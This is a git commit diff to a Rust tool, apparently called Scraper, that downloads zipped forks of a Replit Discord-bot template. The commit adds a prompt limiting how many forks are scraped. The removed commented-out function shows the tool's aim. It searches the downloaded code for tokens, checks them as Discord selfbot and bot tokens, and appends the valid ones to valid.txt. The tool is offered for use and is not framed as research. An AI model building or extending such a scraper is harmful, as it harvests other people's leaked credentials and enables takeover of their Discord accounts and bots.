ede0a4d1422bd9f8317717c1e3f2c1f18d6cea42
Shell <72198971+Shell1010@users.noreply.github.com>
2022-10-31 14:42:36 +0000

    Added feature to set how many forks to scrape

--- src/main.rs
+++ src/main.rs
@@ -3,9 +3,10 @@ mod repl;
 use repl::Replit;
 use std::sync::Arc;
 use futures::{stream::futures_unordered::FuturesUnordered, StreamExt};
-use std::io;
+use std::io::{self, stdout, Write};
 use tokio::fs::OpenOptions;
 use tokio::io::AsyncWriteExt;
+
 
 #[tokio::main()]
 async fn main() {
@@ -15,13 +16,13 @@ async fn main() {
 
     println!("\x1b[0;31m
 
-    ╔═════════════╬══════════════╗
-    ║ █▀ █▀▀ █▀█ ▄▀█ █▀█ █▀▀ █▀█ ║
-    ║ ▄█ █▄▄ █▀▄ █▀█ █▀▀ ██▄ █▀▄ ║
-    ╚═════════════╬══════════════╝
-     ╔════════════╬═════════════╗
-     ║       MADE BY SHELL      ║
-     ╚══════════════════════════╝
+        ╔═════════════╬══════════════╗
+        ║ █▀ █▀▀ █▀█ ▄▀█ █▀█ █▀▀ █▀█ ║
+        ║ ▄█ █▄▄ █▀▄ █▀█ █▀▀ ██▄ █▀▄ ║
+        ╚═════════════╬══════════════╝
+        ╔════════════╬═════════════╗
+        ║       MADE BY SHELL      ║
+        ╚══════════════════════════╝
     \x1b[0m");
     println!("\x1b[0;31mView https://github.com/Shell1010 for any future projects.
 Join our Discord Server for Help & Support + Announcements regarding future projects
@@ -31,92 +32,10 @@ https://discord.gg/qCJwVERPRV\x1b[0m");
 }
 
 
-// async fn scrape_forks() {
-//     println!("\x1b[0;32mExample URL: /@templates/Discord-Bot-Starter\x1b[0m");
-//     println!("\x1b[0;32mPlease input the URL to the repl: [>]\x1b[0m");
-//     let mut url = String::new();
-//     io::stdin()
-//     .read_line(&mut url)
-//     .expect("Failed to read line");
-
-//     let repl = Replit::new(url.trim());
-//     let id = repl.get_id().await;
-
-//     let (urls, _ids) = repl.get_forks(&id).await;
-//     let client = Arc::new(Client::new());
-//     let mut futs = FuturesUnordered::new();
-//     let mut count = 1;
-//     let mut zips = Vec::new();
-
-
-
-
-//     for url in urls {
-//         let rep = repl.clone();
-//         futs.push(rep.get_zip(client.clone(), url.clone(), count));
-//         count += 1;
-//     };
-
-
-//     while let Some(val) = futs.next().await {
-//         match val {
-//             Some(val) => zips.push(val),
-//             None => (),
-//         }
-//     }
-//     println!("\x1b[0;32mFinished all downloads!\x1b[0m");
-//     let mut tokens: Vec<String> = Vec::new();
-//     for zip in zips {
-//         let mut token = repl.search_extract(zip).await;
-//         tokens.append(&mut token);
-//     }
-//     // Check Selfbot tokens
-//     let file_writer = OpenOptions::new()
-//         .create(true)
-//         .append(true)
-//         .open("valid.txt")
-//         .await;
-//     match file_writer {
-//         Ok(mut file_writer) => {
-//             file_writer.write_all(format!("Self:\n").as_bytes()).await.unwrap();
-//             let mut futs = FuturesUnordered::new();
-//             for token in tokens.clone() {
-//                 futs.push(repl.self_check_tokens(client.clone(), token.clone()));
-//             }
-//             while let Some(_) = futs.next().await {}
-//         },
-//         Err(e) => panic!("Could not create file write object, Error: {e}")
-//     }
-
-
-//     // Check Bot tokens
-//     let file_writer = OpenOptions::new()
-//         .create(true)
-//         .append(true)
-//         .open("valid.txt")
-//         .await;
-//     match file_writer {
-//         Ok(mut file_writer) => {
-//             file_writer.write_all(format!("Bot:\n").as_bytes()).await.unwrap();
-//             let mut futs = FuturesUnordered::new();
-//             for token in tokens {
-//                 futs.push(repl.bot_check_tokens(client.clone(), token.clone()));
-//             }
-//             while let Some(_) = futs.next().await {}
-//         println!("Finished");
-//         },
-//         Err(e) => panic!("Could not create file write object, Error: {e}")
-//     }
-
-
-// }
-
-
-
 async fn chunk_scrape_forks() {
-
     println!("\x1b[0;32mExample URL: /@templates/Discord-Bot-Starter\x1b[0m");
-    println!("\x1b[0;32mPlease input the URL to the repl: [>]\x1b[0m");
+    print!("\x1b[0;32mPlease input the URL to the repl: [>]\x1b[0m ");
+    stdout().flush().unwrap();
     let mut url = String::new();
     io::stdin()
     .read_line(&mut url)
@@ -126,6 +45,13 @@ async fn chunk_scrape_forks() {
     let id = repl.get_id().await;
 
     let (urls, _ids) = repl.get_forks(&id).await;
+    print!("\x1b[0;32mAmount of forks to scrape: [>]\x1b[0m ");
+    stdout().flush().unwrap();
+    let mut amount = String::new();
+    io::stdin()
+    .read_line(&mut amount)
+    .expect("Failed to read line");
+    let amount = amount.trim().parse::<u32>().unwrap();
     let client = Arc::new(Client::new());
     let mut futs = FuturesUnordered::new();
     let mut count = 1;
@@ -145,6 +71,10 @@ async fn chunk_scrape_forks() {
             }
             chunk_count = 0
         }
+        if count >= amount {
+            break;
+        }
+
     };
 
 
